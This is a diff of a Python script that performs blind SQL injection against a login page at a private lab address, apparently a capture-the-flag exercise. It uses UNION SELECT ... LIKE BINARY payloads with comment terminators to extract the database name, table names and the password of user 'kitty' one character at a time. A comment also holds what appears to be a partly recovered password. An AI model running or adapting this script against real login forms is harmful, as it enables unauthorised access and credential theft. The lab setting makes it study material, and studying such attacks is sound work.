@@ -1,12 +1,14 @@
 import requests
 
-# List of characters to check for
-elements = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+# List of characters to check for - some characters may not be allowed or interpreted as special by DB engineL0_g_L_v3_K_t_Y
+elements = list("_+-{}(), abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
 
 # URL to send requests to
-url = 'http://10.10.117.155/index.php'
+url = 'http://10.10.46.66/index.php'
 # DB Name to retrive
 db_name = []
+
+# SQLi Queries
 # SQLi query payload to retrive DB name
 #payload = 'kitty\' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY \''
 
@@ -14,7 +16,7 @@ db_name = []
 #payload = 'kitty\' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY \''
 
 # SQLi query payload to retrive user password from table
-payload = 'kitty\' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY \''
+payload = 'kitty\' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\'kitty\' AND password LIKE BINARY \''
 
 Flag = True
 
@@ -27,7 +29,7 @@ while Flag == True:
         
         print('Possible DB Element: '+str(''.join(db_name)))
 
-        req = {'username': payload +str(''.join(db_name))+'%\' -- -', 'password': '123456'}
+        req = {'username': payload +str(''.join(db_name)).replace('%', r'\%').replace('_', r'\_')+'%\' -- -', 'password': '123456'}
         query = requests.post(url, req)
 
         # Send request and check response based on error message
